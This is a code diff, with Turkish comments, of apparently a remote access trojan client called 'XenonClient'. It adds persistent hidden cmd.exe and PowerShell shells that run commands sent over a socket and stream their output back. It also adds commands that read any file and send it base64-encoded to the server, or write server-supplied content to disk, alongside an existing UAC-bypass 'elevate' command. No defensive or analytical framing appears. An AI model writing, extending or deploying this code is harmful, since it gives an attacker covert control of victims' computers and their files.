@@ -25,6 +25,12 @@ class XenonClient:
         self.chat_win = None
         self.chat_box = None
         self.chat_running = False
+        self.cmd_process = None      # kalıcı CMD shell
+        self.ps_process = None       # kalıcı PowerShell
+        self.cmd_output_thread = None
+        self.ps_output_thread = None
+        self.cmd_lock = threading.Lock()
+        self.ps_lock = threading.Lock()
 
     def get_sys_info(self):
         return json.dumps({
@@ -90,15 +96,21 @@ class XenonClient:
                 elif data.startswith("open_url|"):
                     webbrowser.open(data.split("|")[1])
 
-                elif data.startswith("shell|"):
-                    self.run_cmd(data.split("|")[1], "cmd")
+                elif data.startswith("shell_cmd|"):   # kalıcı CMD komutu
+                    cmd = data.split("|", 1)[1]
+                    self.run_persistent_cmd(cmd, "cmd")
                 
-                elif data.startswith("ps|"):
-                    self.run_cmd(data.split("|")[1], "powershell")
+                elif data.startswith("ps_cmd|"):      # kalıcı PowerShell komutu
+                    cmd = data.split("|", 1)[1]
+                    self.run_persistent_cmd(cmd, "powershell")
 
                 elif data.startswith("elevate|"):
                     target = "cmd.exe" if "cmd" in data else "powershell.exe"
                     self.uac_bypass(target)
+
+                elif data.startswith("close_shell|"):
+                    shell_type = data.split("|")[1]
+                    self.close_shell(shell_type)
 
                 elif data.startswith("playsound|"):
                     parts = data.split("|", 2)
@@ -107,8 +119,117 @@ class XenonClient:
                         encoded = parts[2]
                         threading.Thread(target=self.play_audio, args=(filename, encoded), daemon=True).start()
 
-            except: break
+                elif data.startswith("edit_file|"):
+                    file_path = data.split("|", 1)[1]
+                    threading.Thread(target=self.send_file_content, args=(file_path,), daemon=True).start()
+
+                elif data.startswith("save_file|"):
+                    parts = data.split("|", 2)
+                    if len(parts) == 3:
+                        file_path = parts[1]
+                        content_b64 = parts[2]
+                        self.save_file_content(file_path, content_b64)
+
+            except Exception as e:
+                print(f"Listen hatası: {e}")
+                break
         if self.sock: self.sock.close()
+
+    def run_persistent_cmd(self, command, shell_type):
+        """Kalıcı shell process'ine komut gönder ve çıktıyı oku."""
+        def target():
+            try:
+                if shell_type == "cmd":
+                    with self.cmd_lock:
+                        if self.cmd_process is None:
+                            # CMD shell başlat
+                            self.cmd_process = subprocess.Popen(
+                                ["cmd.exe"],
+                                stdin=subprocess.PIPE,
+                                stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE,
+                                shell=True,
+                                text=True,
+                                bufsize=1
+                            )
+                            # Çıktı okuyucu thread başlat
+                            self.cmd_output_thread = threading.Thread(target=self.read_cmd_output, daemon=True)
+                            self.cmd_output_thread.start()
+                        # Komutu yaz
+                        self.cmd_process.stdin.write(command + "\n")
+                        self.cmd_process.stdin.flush()
+                elif shell_type == "powershell":
+                    with self.ps_lock:
+                        if self.ps_process is None:
+                            self.ps_process = subprocess.Popen(
+                                ["powershell.exe", "-NoExit", "-Command", "-"],
+                                stdin=subprocess.PIPE,
+                                stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE,
+                                shell=True,
+                                text=True,
+                                bufsize=1
+                            )
+                            self.ps_output_thread = threading.Thread(target=self.read_ps_output, daemon=True)
+                            self.ps_output_thread.start()
+                        self.ps_process.stdin.write(command + "\n")
+                        self.ps_process.stdin.flush()
+            except Exception as e:
+                self.sock.send(f"shell_res|Hata: {str(e)}\n".encode("utf-8"))
+        threading.Thread(target=target, daemon=True).start()
+
+    def read_cmd_output(self):
+        """CMD çıktısını sürekli oku ve sunucuya gönder."""
+        while self.cmd_process and self.cmd_process.poll() is None:
+            try:
+                line = self.cmd_process.stdout.readline()
+                if line:
+                    self.sock.send(f"shell_res|{line}".encode("utf-8", errors="replace"))
+                else:
+                    time.sleep(0.1)
+            except:
+                break
+
+    def read_ps_output(self):
+        """PowerShell çıktısını oku."""
+        while self.ps_process and self.ps_process.poll() is None:
+            try:
+                line = self.ps_process.stdout.readline()
+                if line:
+                    self.sock.send(f"shell_res|{line}".encode("utf-8", errors="replace"))
+                else:
+                    time.sleep(0.1)
+            except:
+                break
+
+    def close_shell(self, shell_type):
+        """Shell process'ini kapat."""
+        if shell_type == "cmd" and self.cmd_process:
+            self.cmd_process.terminate()
+            self.cmd_process = None
+        elif shell_type == "powershell" and self.ps_process:
+            self.ps_process.terminate()
+            self.ps_process = None
+
+    def send_file_content(self, file_path):
+        """Dosya içeriğini oku, base64 encode et ve gönder."""
+        try:
+            with open(file_path, "rb") as f:
+                data = f.read()
+            encoded = base64.b64encode(data).decode('utf-8')
+            self.sock.send(f"file_content|{file_path}|{encoded}".encode("utf-8"))
+        except Exception as e:
+            self.sock.send(f"file_content|{file_path}|".encode("utf-8") + base64.b64encode(str(e).encode()).decode('utf-8').encode())
+
+    def save_file_content(self, file_path, content_b64):
+        """Base64 içeriği dosyaya yaz."""
+        try:
+            data = base64.b64decode(content_b64)
+            with open(file_path, "wb") as f:
+                f.write(data)
+            # Başarılı mesajı gönderebiliriz ama opsiyonel
+        except Exception as e:
+            print(f"Dosya kaydedilemedi: {e}")
 
     def play_audio(self, filename, encoded):
         try:
@@ -118,14 +239,11 @@ class XenonClient:
                 f.write(data)
                 temp_path = f.name
 
-            self.play_sound_file(temp_path)
-
-            # 10 saniye sonra geçici dosyayı sil (ses bitene kadar bekle)
-            threading.Timer(10, lambda: os.unlink(temp_path)).start()
+            self.play_sound_file(temp_path, delete_after=True)
         except Exception as e:
             print(f"[!] Ses çalma hatası: {e}")
 
-    def play_sound_file(self, file_path):
+    def play_sound_file(self, file_path, delete_after=False):
         system = platform.system()
         try:
             import pygame
@@ -135,36 +253,40 @@ class XenonClient:
             while pygame.mixer.music.get_busy():
                 time.sleep(0.1)
             pygame.mixer.quit()
+            if delete_after:
+                os.unlink(file_path)
         except ImportError:
+            # pygame yoksa platforma özel
             if system == "Windows":
                 if file_path.lower().endswith('.wav'):
                     import winsound
                     winsound.PlaySound(file_path, winsound.SND_FILENAME)
+                    if delete_after:
+                        os.unlink(file_path)
                 else:
+                    # MP3 vs. için varsayılan oynatıcıda aç
                     os.startfile(file_path)
+                    # Ne zaman bittiğini bilemeyiz, 10 saniye sonra silmeyi dene
+                    if delete_after:
+                        threading.Timer(10, lambda: os.unlink(file_path)).start()
             elif system == "Linux":
-                os.system(f"aplay '{file_path}' 2>/dev/null || paplay '{file_path}'")
+                # aplay veya paplay ile oynat, bitince sil
+                def play_and_remove():
+                    os.system(f"aplay '{file_path}' 2>/dev/null || paplay '{file_path}'")
+                    if delete_after:
+                        os.unlink(file_path)
+                threading.Thread(target=play_and_remove, daemon=True).start()
             elif system == "Darwin":
-                os.system(f"afplay '{file_path}'")
+                def play_and_remove():
+                    os.system(f"afplay '{file_path}'")
+                    if delete_after:
+                        os.unlink(file_path)
+                threading.Thread(target=play_and_remove, daemon=True).start()
             else:
                 print("Desteklenmeyen işletim sistemi")
 
-    def run_cmd(self, command_to_run, mode):
-        def task():
-            try:
-                final_cmd = command_to_run
-                if mode == "powershell":
-                    final_cmd = f"powershell -ExecutionPolicy Bypass -Command {command_to_run}"
-                
-                proc = subprocess.Popen(final_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                stdout, stderr = proc.communicate()
-                res = (stdout + stderr).decode("cp857", errors="replace")
-                
-                if not res.strip(): res = "Komut çalıştırıldı (Çıktı yok)."
-                self.sock.send(f"shell_res|{res}".encode("utf-8"))
-            except Exception as e:
-                self.sock.send(f"shell_res|Hata: {str(e)}".encode("utf-8"))
-        threading.Thread(target=task, daemon=True).start()
+    # Eski run_cmd fonksiyonunu kaldırabiliriz, artık kalıcı shell kullanıyoruz.
+    # Ancak uyumluluk için eski komutlar da çalışsın istersen ekleyebiliriz.
 
     def gui_chat(self):
         self.chat_running = True
